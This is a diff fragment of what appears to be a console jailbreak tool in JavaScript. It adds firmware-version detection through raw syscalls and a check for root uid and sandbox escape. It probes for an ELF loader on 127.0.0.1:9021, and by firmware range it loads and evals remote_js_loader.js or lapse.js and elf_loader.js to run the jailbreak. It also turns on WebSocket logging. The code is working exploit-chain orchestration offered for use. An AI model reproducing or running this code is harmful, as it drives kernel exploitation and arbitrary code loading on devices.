+            const cur_uid = syscall(SYSCALL.getuid);
+            const is_in_sandbox = syscall(SYSCALL.is_in_sandbox);
+            if (cur_uid === 0n && is_in_sandbox === 0n) {
+                return true;
+            } else {
 
-        /***** Let's trigger Lapse *****/
+                // Check if elfldr is running at 9021
+                const sockaddr_in = malloc(16);
+                const enable = malloc(4);
 
+                const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
+                if (sock_fd === 0xffffffffffffffffn) {
+                    throw new Error("socket failed: " + hex(sock_fd));
+                }
 
-        script = get_script("lapse.js");
-        eval(script);
-        logger.flush();
-        send_notification("elf_loader.js");
-        script = get_script("elf_loader.js");
-        eval(script);
-        logger.flush();
+                try {
+                    write32_uncompressed(enable, 1);
+                    syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
+
+                    write8_uncompressed(sockaddr_in + 1n, AF_INET);
+                    write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
+                    write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
+
+                    // Try to connect to 127.0.0.1:9021
+                    const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);
+
+                    if (ret === 0n) {
+                        syscall(SYSCALL.close, sock_fd);
+                        return true;
+                    } else {
+                        syscall(SYSCALL.close, sock_fd);
+                        return false;
+                    }
+                } catch (e) {
+                    syscall(SYSCALL.close, sock_fd);
+                    return false;
+                }
+            }
+        }
+
+        function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
+            const translate_name_mib = malloc(0x8);
+            const buf_size = 0x70;
+            const mib = malloc(buf_size);
+            const size = malloc(0x8);
+
+            write64_uncompressed(translate_name_mib, 0x300000000n);
+            write64_uncompressed(size, BigInt(buf_size));
+
+            const name_addr = alloc_string(name);
+            const name_len = BigInt(name.length);
+
+            if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
+                throw new Error("failed to translate sysctl name to mib (" + name + ")");
+            }
+
+            if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) === 0xffffffffffffffffn) {
+                return false;
+            }
+
+            return true;
+        }
+
+        function get_fwversion() {
+            const buf = malloc(0x8);
+            const size = malloc(0x8);
+            write64_uncompressed(size, 0x8n);
+
+            if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
+                const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
+                const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)
+
+                const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
+                return version;
+            }
+
+            return null;
+        }
+
+        function compare_version(a, b) {
+            const [amaj, amin] = a.split('.').map(Number);
+            const [bmaj, bmin] = b.split('.').map(Number);
+            return amaj === bmaj ? amin - bmin : amaj - bmaj;
+        }
+
+        /***** Let's trigger Jailbreak *****/
+
+        FW_VERSION = get_fwversion();
+
+        prefetch_scratch = malloc(256);
+        script_scratch = malloc(512*1024);
+
+        var kernel = { addr: {}, read_buffer: null, write_buffer: null };
+        var kernel_offset = null;
+
+        if (compare_version(FW_VERSION, "12.40") > 0) {
+            logger.log("Unsupported FW_VERSION: " + FW_VERSION);
+            send_notification("Unsupported FW_VERSION: " + FW_VERSION);
+        } else if (compare_version(FW_VERSION, "10.01") > 0) {
+            const script_name = "remote_js_loader.js";
+            logger.log("loading " + script_name);
+
+            let script = get_script(script_name);
+
+            const logger_log_orig = logger.log.bind(logger);
+            logger.log = function(msg) {
+                logger_log_orig(msg);
+                if (!_cr_caching_active) {
+                    nanosleep_ms(5);
+                }
+            };
+
+            if (script.trim().startsWith("<")) {
+                let errorMsg = "get_script returned HTML instead of JS (likely a 404 error). First 50 chars: " + script.substring(0, 50);
+                logger.log(errorMsg);
+                logger.flush();
+                return;
+            }
+
+            eval(script);
+            logger.flush();
+        } else {
+            // Trigger Lapse
+            script = get_script("lapse.js");
+            eval(script);
+            logger.flush();
+            send_notification("elf_loader.js");
+            script = get_script("elf_loader.js");
+            eval(script);
+            logger.flush();
+        }
 
         if (!is_jailbroken()) {
+            logger.log("Jailbreak didn't succeed. Reboot and Try again!");
             send_notification("Jailbreak didn't succeed. Reboot and Try again!");
-            throw new Error("Jailbreak didn't succeed");
+            // throw new Error("Jailbreak didn't succeed");
         }
 
 
@@ -1486,5 +1707,5 @@ function main () {
     }
 }
 
-//ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});// uncomment this to enable WebSocket logging
-main();
+
+ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});
